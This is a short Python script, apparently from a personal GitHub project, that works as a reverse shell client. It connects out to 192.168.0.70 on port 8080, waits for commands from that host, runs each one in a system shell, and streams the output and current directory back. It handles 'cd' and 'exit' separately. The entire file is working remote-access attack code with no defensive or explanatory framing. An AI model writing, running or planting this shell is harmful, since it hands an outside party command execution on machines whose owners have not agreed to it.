import sys
import os
import socket
import subprocess
import time
import datetime

# WRITTEN BY: Peter Macharia (https://github.com/peter-macharia)

PORT = 8080
IP_ADDR = '192.168.0.70'
data = ''


def create_conn():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        return sock
    except:
        print("An error occurred when creating the connection")

def change_dir(command):
    try:
	# Change directory of the command with list slicing
        os.chdir(command[3:])
        sock.sendall(str.encode(str(os.getcwd())))
    except:
        pass


def system_commands(command):
    try:
        res = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        sock.sendall(res.stdout.read())
        sock.sendall(res.stderr.read())
        sock.sendall(str.encode('\ndone\n\n'))
        sock.sendall(str.encode(str(os.getcwd())))
    except:
        str_error = "command not recognized" + "\n"
        sock.sendall(str.encode(os.getcwd()))

def connect_to_host():
    try:
        sock.connect_ex((IP_ADDR, PORT))
    except socket.gaierror or socket.error as e:
        sys.exit(e)

# lets call the functions
def perform_task():
    while True:

        data = sock.recv(1024)
        data = data.decode("utf-8", "replace")

        if "exit" in data:
            sock.sendall(str.encode(" exit"))
            time.sleep(3)
            break

        if data[:2] == "cd":
            change_dir(data)

        if len(data) > 0:
            system_commands(data)


if __name__ == '__main__':
    sock = create_conn()
    connect_to_host()
    perform_task()
